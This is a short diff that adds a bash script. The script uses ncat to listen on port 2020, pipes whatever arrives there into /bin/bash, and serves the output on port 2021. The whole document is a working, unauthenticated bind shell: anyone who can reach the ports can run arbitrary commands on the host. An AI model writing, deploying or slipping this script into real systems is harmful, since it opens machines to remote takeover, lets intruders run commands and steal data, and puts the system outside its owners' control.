@@ -1,0 +1,3 @@
+#!/bin/bash
+echo incoming port 2020 ~ outgoing port 2021
+ncat -l -k 2020 | /bin/bash | ncat -l -k 2021
